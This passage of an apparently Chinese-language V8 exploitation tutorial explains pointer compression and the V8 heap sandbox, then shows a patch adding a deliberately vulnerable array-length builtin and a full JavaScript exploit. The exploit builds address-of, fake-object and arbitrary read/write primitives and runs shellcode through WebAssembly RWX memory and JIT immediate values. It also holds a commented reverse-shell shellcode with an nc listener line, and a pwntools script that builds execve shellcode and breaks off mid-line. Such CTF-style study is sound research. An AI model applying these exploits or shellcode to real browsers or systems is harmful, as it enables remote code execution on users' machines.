class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">addressOf</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] rwx mem addr: &quot;</span> + <span class="title function_">hex</span>(rwx_mem_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x9090909090909090n</span>,</span><br><span class="line">    <span class="number">0x636c6163782fb848n</span>,</span><br><span class="line">    <span class="number">0x73752fb848500000n</span>,</span><br><span class="line">    <span class="number">0x8948506e69622f72n</span>,</span><br><span class="line">    <span class="number">0x89485750c03148e7n</span>,</span><br><span class="line">    <span class="number">0x3ac0c748d23148e6n</span>,</span><br><span class="line">    <span class="number">0x4944b84850000030n</span>,</span><br><span class="line">    <span class="number">0x48503d59414c5053n</span>,</span><br><span class="line">    <span class="number">0x485250c03148e289n</span>,</span><br><span class="line">    <span class="number">0x00003bc0c748e289n</span>,</span><br><span class="line">    <span class="number">0x0000000000050f00n</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment">// var shellcode=[</span></span><br><span class="line"><span class="comment">// 0x6a5f026a9958296an,</span></span><br><span class="line"><span class="comment">// 0xb9489748050f5e01n,</span></span><br><span class="line"><span class="comment">// 0x0100007f39300002n,</span></span><br><span class="line"><span class="comment">// 0x6a5a106ae6894851n,</span></span><br><span class="line"><span class="comment">// 0x485e036a050f582an,</span></span><br><span class="line"><span class="comment">// 0x75050f58216aceffn,</span></span><br><span class="line"><span class="comment">// 0x2fbb4899583b6af6n,</span></span><br><span class="line"><span class="comment">// 0x530068732f6e6962n,</span></span><br><span class="line"><span class="comment">// 0xe689485752e78948n,</span></span><br><span class="line"><span class="comment">// 0x000000000000050fn]</span></span><br><span class="line"><span class="comment">//nc -lvvp 12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbitrary_address_write</span>(rwx_mem_addr + <span class="title class_">BigInt</span>(i) * <span class="number">8n</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure></div>
<h1 id="heap-sandbox">Heap Sandbox</h1>
<h2 id="指针压缩">指针压缩</h2>
<p>以 <code>ArrayBuffer</code> 为例，正常情况下的内存分布如下图所示：
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/84a55035a025b34164f79326f8796c9a.png"
                     
alt="在这里插入图片描述" 
                > 在 V8 高版本中会基于数据 4GB 对齐所有指针高
32 位相同而只保留低 32 位而指针（类似于32位下的 HeapObject
指针），而基址存放在 r13 寄存器指向的内存中，从而节省空间。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2bb3db72d385bb5579b9a37487883e4f.png"
                     
alt="在这里插入图片描述" 
                > 因此 <code>ArrayBuffer</code>
的内存分布图如下图所示： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/491e63bee3aaaeeac28f6f7d934998d8.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>在地址泄露的时候可以将指针覆盖成 0
这样就可以泄露基址附近的数据，从而泄露基址。</p>
<h2 id="沙箱">沙箱</h2>
<p>指针压缩的方法虽然在一定程度上把任意地址读写限制在了 4GB 的 V8
堆的范围内，然而 V8 的某些对象比如 <code>ArrayBuffer</code>
中还存在不指向 V8 对象的指针（例如示例中的 <code>BackingStorage</code>
和
<code>ArrayBufferExtension</code>），这些指针不会被指针压缩所以依然可以实现任意地址读写，而沙箱的作用就是限制这些指针的任意地址读写范围。</p>
<p>在开启沙箱后 <code>ArrayBuffer</code> 的内存分布图如下图所示： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9538d4de1f255ac0725b01321b99bd5e.png"
                     
alt="在这里插入图片描述" 
                > 沙箱的具体实现方式有两种：</p>
<ul>
<li><p>一种是类似上图中的 <code>ArrayBufferExtension</code>
指针。在开启沙箱后，<code>ArrayBufferExtension</code>
存储的不再是堆地址，而是一个叫做 External Pointer Table
的表的下标，而在这个表的对应索引处存放着
<code>ArrayBufferExtension</code>
对应结构的地址和类型。这样攻击者就只能访问
<code>ArrayBufferExtension</code>
中存放的信息对应的结构而不能实现任意地址读写且不易实现类型混淆。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/65caf838ed1c9b822d84de2c5345360d.png"
                     
alt="在这里插入图片描述" 
                ></p></li>
<li><p>另一种类似上图中的 <code>BackingStorage</code>。在开启沙箱后
<code>BackingStorage</code> 指针存放的是 <code>BackingStorage</code>
地址与沙箱基址偏移（40bit）左移 24bit
的结果。这个方式和指针压缩相同（实际上基址也相同），只不过访问范围变为
1TB 。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/faca1aa32ed99db16311c6d4f54a6f24.png"
                     
alt="在这里插入图片描述" 
                ></p></li>
</ul>
<p>因此沙箱的整体结构如下图所示：
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/4ec6c1546af4bbefef120695be95d023.png"
                      alt="在这里插入图片描述" style="zoom: 50%;" 
                >
实际的调试结果如下图所示，注意 rwx 段不在沙箱中，因此利用
<code>ArrayBuffer</code> 无法将 shellcode 写入 rwx 段。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f36c6062d602d751d82ae1ce88f43769.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h2 id="沙箱绕过">沙箱绕过</h2>
<h3 id="利用立即数写-shellcode">利用立即数写 shellcode</h3>
<p>这里以一个 demo 为例介绍这种沙箱绕过方法。</p>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/sandbox_bypass/imm_shellcode" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>首先搭建环境：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard bd5b3ae5422e9fa1d0f7a281bbdf709e6db65f62</span><br><span class="line">export DEPOT_TOOLS_UPDATE=0</span><br><span class="line">export PATH=$PATH:~/tools/depot_tools/</span><br><span class="line">gclient sync -D </span><br><span class="line">git apply ./sandbox.diff</span><br><span class="line">./build/install-build-deps.sh</span><br><span class="line">./tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>sandbox.diff</code> 文件内容如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index 49fe48d698..2944eb9edb 100644</span><br><span class="line">--- a/src/builtins/builtins-array.cc</span><br><span class="line">+++ b/src/builtins/builtins-array.cc</span><br><span class="line">@@ -395,6 +395,25 @@ BUILTIN(ArrayPush) &#123;</span><br><span class="line">   return *isolate-&gt;factory()-&gt;NewNumberFromUint((new_length));</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">+BUILTIN(ArrayLen) &#123;</span><br><span class="line">+  uint32_t len = args.length();</span><br><span class="line">+  if(len != 2) return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+</span><br><span class="line">+  Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+      isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+</span><br><span class="line">+  Handle&lt;Object&gt; argLen;</span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+      isolate, argLen, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span><br><span class="line">+  uint32_t newLen = static_cast&lt;uint32_t&gt;(argLen-&gt;Number());</span><br><span class="line">+</span><br><span class="line">+  auto raw = *array;</span><br><span class="line">+  raw.set_length(Smi::FromInt(newLen));</span><br><span class="line">+  return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> namespace &#123;</span><br><span class="line"> </span><br><span class="line"> V8_WARN_UNUSED_RESULT Object GenericArrayPop(Isolate* isolate,</span><br><span class="line">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span><br><span class="line">index 859b5cee9a..a16a7d5ca1 100644</span><br><span class="line">--- a/src/builtins/builtins-definitions.h</span><br><span class="line">+++ b/src/builtins/builtins-definitions.h</span><br><span class="line">@@ -392,6 +392,7 @@ namespace internal &#123;</span><br><span class="line">   CPP(ArrayPrototypeGroupToMap)                                                \</span><br><span class="line">   /* ES6 #sec-array.prototype.push */                                          \</span><br><span class="line">   CPP(ArrayPush)                                                               \</span><br><span class="line">+  CPP(ArrayLen)                                                                \</span><br><span class="line">   TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \</span><br><span class="line">   /* ES6 #sec-array.prototype.shift */                                         \</span><br><span class="line">   CPP(ArrayShift)                                                              \</span><br><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index 5888a5cdab..5d13eac799 100644</span><br><span class="line">--- a/src/compiler/typer.cc</span><br><span class="line">+++ b/src/compiler/typer.cc</span><br><span class="line">@@ -1880,6 +1880,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtin::kArrayPush:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line">+    case Builtin::kArrayLen:</span><br><span class="line">+      return Type::Receiver();</span><br><span class="line">     case Builtin::kArrayPrototypeReverse:</span><br><span class="line">     case Builtin::kArrayPrototypeSlice:</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span><br><span class="line">index 7c7b917502..550b25d4ba 100644</span><br><span class="line">--- a/src/init/bootstrapper.cc</span><br><span class="line">+++ b/src/init/bootstrapper.cc</span><br><span class="line">@@ -1808,6 +1808,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           0, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;push&quot;, Builtin::kArrayPrototypePush,</span><br><span class="line">                           1, false);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, &quot;len&quot;, Builtin::kArrayLen,</span><br><span class="line">+                          2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;reverse&quot;,</span><br><span class="line">                           Builtin::kArrayPrototypeReverse, 0, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;shift&quot;,</span><br></pre></td></tr></table></figure></div>
<p>可以看出，这里在 v8 中添加了一个可以修改 <code>JSArray</code>
长度属性的操作 <code>len</code> 。</p>
<p>这里先实现一下 address of 和 fake object
两个利用原语，具体方法可以是越界写数组元素或伪造 <code>Map</code> 。</p>
<p>这里有几个需要注意的点：</p>
<ul>
<li>通过修改 <code>Map</code> 使得 <code>ObjectArray</code> 变为
<code>DoubleArray</code> 后可以以 double
形式读取到数组中的元素但是不能以 double
形式写入值，即数组的读和写的类型检查不同。如果想要能以 double
形式写入值需要伪造 <code>element</code> 的 <code>Map</code> 。</li>
<li>应当先触发 JIT 再实现两个利用原语，因为 JIT 会导致前面构造的
<code>Array</code> 的各个结构的相对位置发生变化。</li>
<li>通过 GC 将 Array 置于 Old Space 后 <code>elememt</code>
成员放到最后，不容易利用。</li>
<li>由于指针压缩导致成员大小是 4 字节，而 <code>DoubleArray</code> 是 8
字节写，因此需要注意尽量不要覆盖其它成员。</li>
</ul>
<p>首先有如下函数：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>上面这种形式的函数 JIT
后的汇编代码如下，显然其中的立即数是可以控制的，并且可以通过堆内任意地址写修改
<code>code_entry_point</code> 指向汇编代码中的立即数，因此可以像<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/llvm_pass_pwn/ciscn2022_satool" >这道题 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>一样在立即数中写
shellcode 。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/5e33756474098f1771e925e3d38b4e76.png"
                     
alt="在这里插入图片描述" 
                > 这里需要注意的是 <code>vmovsd</code>
函数在后面 <code>QWORD PTR [rcx+offset]</code> 中的 <code>offset</code>
在从 0x7f 变为 0x87 的时候指令长度增加了 3 字节，因此需要注意需要修改
<code>jmp</code> 的跳转偏移或者避免使用 rcx 寄存器。因为 rcx
被用来写数据所以原本是指向可读写的内存，因此指向下面这条指令不会出错。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c31d9c0839fbe94e96957695e0ceb913.png"
                     
alt="在这里插入图片描述" 
                > 另外注意 shellcode 最终执行的是
<code>execve("/usr/bin/xcalc", &amp;"/usr/bin/xcalc", &amp;"DISPLAY=:0");</code>
，对应那些二级字符串指针的参数需要进行 0 截断。</p>
<p>exp 如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">oob_array.<span class="title function_">len</span>(<span class="number">114514</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fake_object</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">11</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    double_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(offset);</span><br><span class="line">    oob_array[<span class="number">11</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> double_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">18</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>) &lt;&lt; <span class="number">32n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">18</span>]) &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">18</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>) &lt;&lt; <span class="number">32n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">18</span>]) &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shellcode_offset = <span class="title function_">offset_of</span>(shellcode);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_offset = (<span class="title function_">read</span>(shellcode_offset + <span class="number">0x18n</span>) &amp; <span class="number">0xFFFFFFFFn</span>) + <span class="number">8n</span>;</span><br><span class="line">leak_data = <span class="title function_">read</span>(leak_offset);</span><br><span class="line"></span><br><span class="line">code = leak_data &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">code_entry_point = leak_data &gt;&gt; <span class="number">32n</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">write</span>(leak_offset, code | ((code_entry_point + <span class="number">0x66n</span>) &lt;&lt; <span class="number">32n</span>));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] leak offset: &quot;</span> + <span class="title function_">hex</span>(leak_offset));</span><br><span class="line"></span><br><span class="line"><span class="comment">// %DebugPrint(shellcode);</span></span><br><span class="line"><span class="comment">// % SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<p>通常可以使用如下脚本生成 shellcode
。注意跳转距离可能会有变化，需要调整。 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">iss=<span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">global</span> iss</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(iss)+<span class="string">&#x27;:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(x)))</span><br><span class="line">    jmp = <span class="string">b&#x27;\xeb\x0c&#x27;</span></span><br><span class="line">    <span class="comment"># if iss&lt;=11: &#x27;</span></span><br><span class="line">    <span class="comment"># else :jmp=b&quot;\xeb\x16&quot;</span></span><br><span class="line">    iss +=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> u64(x.ljust(<span class="number">6</span>, <span class="string">b&#x27;\x90&#x27;</span>) + jmp)</span><br><span class="line"><span class="comment">#orw flag.txt</span></span><br><span class="line"><span class="comment"># imm1 = [</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov eax,0x7478742e&quot;), # &quot;.txt&quot;</span></span><br><span class="line"><span class="comment">#    asm(&quot;push 0;shl rax,0x20&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;add rax,0x67616c66&quot;), # &quot;flag&quot;</span></span><br><span class="line"><span class="comment">#    asm(&quot;push rax&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov rdi, rsp; xor rsi, rsi&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov eax, 2&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;xor edx, edx;syscall&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov edi,3&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;lea rsi, [rsp-8]&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov edx, 0x80&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;xor eax, eax;syscall;xor edi, edi&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov al, 1;syscall;&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov al,59;syscall;&quot;)</span></span><br><span class="line"><span class="comment"># ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># execve(&quot;/bin/sh&quot;, 0, 0);</span></span><br><span class="line"><span class="comment"># imm1 = [</span></span><br><span class="line"><span class="comment">#    asm(&quot;push 0x67616c66&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov rdi, rsp; xor rsi, rsi&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov eax, 2&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;xor edx, edx;syscall&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov edi,3&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;lea rsi, [rsp-8]&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov edx, 0x80&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;xor eax, eax;syscall;xor edi, edi&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov al, 1;syscall&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov al,60;syscall;&quot;)</span></span><br><span class="line"><span class="comment"># ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># execve(&quot;/bin/sh&quot;, &#123;&quot;cat&quot;, &quot;flag&quot;, NULL&#125;, 0);</span></span><br><span class="line">imm1 = [</span><br><span class="line">    asm(<span class="string">&quot;mov eax,0x7478742e&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;push 0;shl rax,0x20&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;add rax,0x67616c66&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;push rax;push 0x746163&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;push 0&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;lea rax, [rsp+0x10];push rax&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;sub rax, 8; push rax&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;mov rsi, rsp&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;mov eax,0x68732f&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;shl rax, 0x20&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;add rax, 0x6e69622f&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;push rax;mov rdi, rsp;&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;mov eax, 